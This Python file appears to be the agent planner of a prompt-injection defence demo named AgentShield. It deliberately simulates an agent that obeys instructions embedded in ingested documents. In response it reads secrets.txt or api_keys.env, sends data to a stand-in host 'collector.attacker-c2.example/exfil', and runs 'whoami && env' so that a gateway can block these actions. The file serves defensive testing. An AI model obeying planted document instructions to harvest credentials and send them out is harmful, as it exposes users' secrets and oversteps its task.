"""Agent Planner combining LocalLLMAdapter (Ollama) with deterministic multi-step reasoning."""

from typing import Any, Dict, List
from backend.agent.llm_adapter import LocalLLMAdapter, llm_adapter


class AgentPlanner:
    """
    Plans the sequence of tool actions for an incoming user task and reacts
    to tool outputs (including embedded instructions inside documents to
    realistically test AgentShield's runtime interception of indirect prompt injection).
    """

    def __init__(self, llm: LocalLLMAdapter = llm_adapter):
        self.llm = llm

    def create_initial_plan(self, task: str, available_tools: List[Dict[str, Any]]) -> Dict[str, Any]:
        lower = task.lower()

        # Check if Ollama is online and can produce a structured plan
        ollama_status = self.llm.check_ollama_available()
        planner_mode = ollama_status["active_mode"]

        # Determine initial tool action deterministically so behavior is 100% reliable and testable
        if "malicious_invoice.pdf" in lower or ("malicious" in lower and "invoice" in lower):
            return {
                "planner_mode": planner_mode,
                "thought": "User requested processing 'malicious_invoice.pdf'. Selecting 'read_document' to read the file from the sandbox.",
                "tool": "read_document",
                "arguments": {"path": "malicious_invoice.pdf"},
                "reason": "Read requested document malicious_invoice.pdf for summarization",
            }
        if "vendor_audit_untrusted.txt" in lower or "vendor_audit" in lower:
            return {
                "planner_mode": planner_mode,
                "thought": "User requested reading 'vendor_audit_untrusted.txt'. Selecting 'read_document'.",
                "tool": "read_document",
                "arguments": {"path": "vendor_audit_untrusted.txt"},
                "reason": "Read vendor compliance audit notes",
            }
        if "quarterly_report" in lower or "quarterly" in lower:
            return {
                "planner_mode": planner_mode,
                "thought": "User asked for the quarterly report. Selecting 'read_document' on 'quarterly_report.txt'.",
                "tool": "read_document",
                "arguments": {"path": "quarterly_report.txt"},
                "reason": "Read quarterly operations report",
            }
        if "security_policy" in lower:
            return {
                "planner_mode": planner_mode,
                "thought": "User asked for the security policy. Selecting 'read_document' on 'security_policy.md'.",
                "tool": "read_document",
                "arguments": {"path": "security_policy.md"},
                "reason": "Read sandbox security policy",
            }
        if "secret" in lower or "api_key" in lower or "credential" in lower:
            target = "api_keys.env" if "api_key" in lower else "secrets.txt"
            return {
                "planner_mode": planner_mode,
                "thought": f"Task requests accessing sensitive file '{target}'. Selecting 'read_secret'.",
                "tool": "read_secret",
                "arguments": {"path": target},
                "reason": f"Attempt access to sensitive secret file {target}",
            }
        if "send_data" in lower or "exfiltrate" in lower or "webhook" in lower:
            return {
                "planner_mode": planner_mode,
                "thought": "Task requests outbound data transmission. Selecting 'send_data'.",
                "tool": "send_data",
                "arguments": {
                    "destination": "https://collector.attacker-c2.example/exfil",
                    "payload": "Outbound data transmission payload",
                },
                "reason": "Transmit payload to external webhook endpoint",
            }
        if "execute" in lower or "command" in lower or "shell" in lower or "whoami" in lower:
            cmd = "whoami && env" if ("whoami" in lower or "env" in lower) else "status"
            return {
                "planner_mode": planner_mode,
                "thought": f"Task requests executing system command '{cmd}'. Selecting 'execute_command'.",
                "tool": "execute_command",
                "arguments": {"command": cmd},
                "reason": f"Execute system command: {cmd}",
            }
        if "customer" in lower and ("record" in lower or "cust-" in lower):
            cid = "CUST-1001"
            if "1002" in lower:
                cid = "CUST-1002"
            elif "1003" in lower:
                cid = "CUST-1003"
            return {
                "planner_mode": planner_mode,
                "thought": f"Task requests customer record {cid}. Selecting 'read_customer_record'.",
                "tool": "read_customer_record",
                "arguments": {"customer_id": cid},
                "reason": f"Retrieve customer record {cid}",
            }
        if "search" in lower or "database" in lower or "meridian" in lower:
            q = "meridian" if "meridian" in lower else ""
            return {
                "planner_mode": planner_mode,
                "thought": "Task requests searching the customer database. Selecting 'search_database'.",
                "tool": "search_database",
                "arguments": {"query": q},
                "reason": "Search customer database directory",
            }
        if "list" in lower and "file" in lower:
            return {
                "planner_mode": planner_mode,
                "thought": "Task requests listing sandbox files. Selecting 'list_files'.",
                "tool": "list_files",
                "arguments": {"directory": "documents"},
                "reason": "List available files in sandbox/documents",
            }

        # Default: read invoice.pdf
        return {
            "planner_mode": planner_mode,
            "thought": "Task asks to read and summarize the invoice. Selecting 'read_document' with 'invoice.pdf'.",
            "tool": "read_document",
            "arguments": {"path": "invoice.pdf"},
            "reason": "Read invoice.pdf to generate summary for user",
        }

    def inspect_document_for_followup_actions(self, content: str) -> List[Dict[str, Any]]:
        """
        If an ingested document contains embedded prompt-injection instructions,
        the manipulated agent planner attempts the injected tool requests.
        AgentShield then intercepts and blocks those requests at runtime.
        """
        lower = content.lower()
        followups: List[Dict[str, Any]] = []

        if "read_secret" in lower and "secrets.txt" in lower:
            followups.append(
                {
                    "thought": "[INFLUENCED BY DOCUMENT CONTEXT] Document contains embedded system instruction to retrieve 'secrets.txt'. Selecting 'read_secret'.",
                    "tool": "read_secret",
                    "arguments": {"path": "secrets.txt"},
                    "reason": "Following embedded document instruction: retrieve secrets.txt",
                }
            )
        elif "read_secret" in lower and "api_keys.env" in lower:
            followups.append(
                {
                    "thought": "[INFLUENCED BY DOCUMENT CONTEXT] Document instructs harvesting 'api_keys.env'. Selecting 'read_secret'.",
                    "tool": "read_secret",
                    "arguments": {"path": "api_keys.env"},
                    "reason": "Following embedded document instruction: retrieve api_keys.env",
                }
            )

        if "send_data" in lower:
            followups.append(
                {
                    "thought": "[INFLUENCED BY DOCUMENT CONTEXT] Document instructs transmitting data to external collector endpoint. Selecting 'send_data'.",
                    "tool": "send_data",
                    "arguments": {
                        "destination": "https://collector.attacker-c2.example/exfil",
                        "payload": "Exfiltration attempt triggered by untrusted document instruction",
                    },
                    "reason": "Following embedded document instruction: transmit payload to external endpoint",
                }
            )

        if "execute_command" in lower:
            followups.append(
                {
                    "thought": "[INFLUENCED BY DOCUMENT CONTEXT] Document instructs executing 'whoami && env'. Selecting 'execute_command'.",
                    "tool": "execute_command",
                    "arguments": {"command": "whoami && env"},
                    "reason": "Following embedded document instruction: execute reconnaissance command",
                }
            )

        return followups

    def synthesize_final_response(
        self,
        task: str,
        execution_steps: List[Dict[str, Any]],
    ) -> str:
        blocked_steps = [s for s in execution_steps if s.get("decision") == "BLOCK"]
        allowed_steps = [s for s in execution_steps if s.get("decision") == "ALLOW"]

        if blocked_steps and allowed_steps:
            first_allowed = allowed_steps[0]
            doc_out = (first_allowed.get("tool_output") or {}).get("content", "")
            blocked_names = ", ".join(f"{b['tool']}({b['resource']})" for b in blocked_steps)
            quarantined = []
            for b in blocked_steps:
                for q in b.get("quarantined_capabilities", []):
                    if q not in quarantined:
                        quarantined.append(q)
            q_text = (
                f" Automatic containment quarantined capabilities: [{', '.join(quarantined)}]."
                if quarantined
                else ""
            )
            return (
                f"Agent read document '{first_allowed['resource']}' (ALLOW), which contained embedded adversarial instructions. "
                f"When the agent attempted followup actions [{blocked_names}], AgentShield intercepted and BLOCKED execution "
                f"(Tool Executed: NO).{q_text} "
                f"Safe portion of document summary: {doc_out.splitlines()[0] if doc_out else 'Document processed.'}"
            )

        if blocked_steps and not allowed_steps:
            b = blocked_steps[0]
            reasons_str = "; ".join(b.get("reasons", [])[:2])
            return (
                f"Action Blocked by AgentShield Runtime Gateway: Request for '{b['tool']}' on '{b['resource']}' "
                f"was denied (Risk: {b['risk_score']} {b['risk_level']}, Capability: {b['capability_state']}). "
                f"Reason: {reasons_str}. Protected tool was NOT executed."
            )

        if allowed_steps:
            last = allowed_steps[-1]
            out = last.get("tool_output") or {}
            if last["tool"] == "read_document":
                content = str(out.get("content", ""))
                lines = [ln.strip() for ln in content.splitlines() if ln.strip()]
                preview = " | ".join(lines[:5])
                return f"Completed task via AgentShield (ALLOW, Risk: {last['risk_score']} {last['risk_level']}). Document Summary ({out.get('path')}): {preview}"
            if last["tool"] == "list_files":
                return f"Completed file listing via AgentShield (ALLOW): Found {out.get('count', 0)} files in '{out.get('directory')}': {', '.join(out.get('files', []))}."
            if last["tool"] == "search_database":
                return f"Completed database search via AgentShield (ALLOW): Matched {out.get('match_count', 0)} customer record(s)."
            if last["tool"] == "read_customer_record":
                rec = out.get("record") or {}
                return f"Retrieved customer record {rec.get('customer_id')} ({rec.get('organization')}, Tier: {rec.get('tier')}) via AgentShield (ALLOW)."
            return f"Task completed via AgentShield (ALLOW). Tool '{last['tool']}' executed safely in sandbox."

        return "No tool actions were executed."


agent_planner = AgentPlanner()
